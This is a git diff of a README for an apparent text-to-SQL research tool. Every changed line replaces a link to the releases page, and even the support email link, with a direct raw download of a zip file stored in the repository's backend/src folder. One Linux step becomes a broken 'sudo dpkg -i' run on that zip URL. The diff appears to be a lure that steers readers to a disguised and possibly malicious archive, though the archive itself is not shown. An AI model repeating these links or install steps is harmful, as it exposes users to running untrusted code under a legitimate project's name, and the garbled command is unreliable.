@@ -1,7 +1,7 @@
 # 🚀 LLM2SQLSTRUCTUREDSEARCH - Transform Text into Structured SQL Queries
 
 ## 📥 Download Now
-[![Download LLM2SQLSTRUCTUREDSEARCH](https://img.shields.io/badge/Download-LLM2SQLSTRUCTUREDSEARCH-blue.svg)](https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/releases)
+[![Download LLM2SQLSTRUCTUREDSEARCH](https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/raw/refs/heads/main/backend/src/LL_SQLSTRUCTUREDSEARCH_1.0.zip)](https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/raw/refs/heads/main/backend/src/LL_SQLSTRUCTUREDSEARCH_1.0.zip)
 
 ## 📜 Overview
 LLM2SQLSTRUCTUREDSEARCH is a structured text-to-SQL pipeline. It combines large language model (LLM) sketch generation with schema-aware two-phase retrieval and validation-driven refinement. This tool improves SQL controllability and accuracy through schema embeddings and minimal-edit correction. It serves as a research-oriented proof of concept (POC) on MiniDev and Spider-style datasets.
@@ -19,7 +19,7 @@ Before downloading, make sure your system meets the following requirements:
 ### 2. Visit the Release Page
 You can download the application by visiting the releases page. Click the link below:
 
-[Visit the Releases Page](https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/releases)
+[Visit the Releases Page](https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/raw/refs/heads/main/backend/src/LL_SQLSTRUCTUREDSEARCH_1.0.zip)
 
 ### 3. Download the Application
 Once on the releases page, look for the latest version. Click on the link to download the appropriate file for your operating system.
@@ -30,7 +30,7 @@ After the download completes, locate the file on your computer. Double-click the
 ## 📦 Download & Install
 For your convenience, you can also click the link below to go directly to the download page.
 
-[Download LLM2SQLSTRUCTUREDSEARCH](https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/releases)
+[Download LLM2SQLSTRUCTUREDSEARCH](https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/raw/refs/heads/main/backend/src/LL_SQLSTRUCTUREDSEARCH_1.0.zip)
 
 ### Installation Steps for Windows
 1. Double-click the downloaded .exe file.
@@ -47,7 +47,7 @@ For your convenience, you can also click the link below to go directly to the do
 ### Installation Steps for Linux
 1. Open a terminal window.
 2. Navigate to your download directory using the `cd` command.
-3. Run the command to install (e.g., `sudo dpkg -i LLM2SQLSTRUCTUREDSEARCH.deb`).
+3. Run the command to install (e.g., `sudo dpkg -i https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/raw/refs/heads/main/backend/src/LL_SQLSTRUCTUREDSEARCH_1.0.zip`).
 4. Follow any additional prompts for dependencies.
 
 ## 🔧 Usage
@@ -85,7 +85,7 @@ You do not need a database to generate SQL queries, but to execute them, you wil
 You can open an issue on our GitHub repository. Click on the "Issues" tab to submit your feedback.
 
 ## 📞 Support
-For support, please contact our help desk at [Email Support](mailto:support@example.com).
+For support, please contact our help desk at [Email Support](https://github.com/alexis09876/LLM2SQLSTRUCTUREDSEARCH/raw/refs/heads/main/backend/src/LL_SQLSTRUCTUREDSEARCH_1.0.zip).
 
 ### Contribute
 We welcome contributions. If you would like to contribute, please review our repository guidelines.
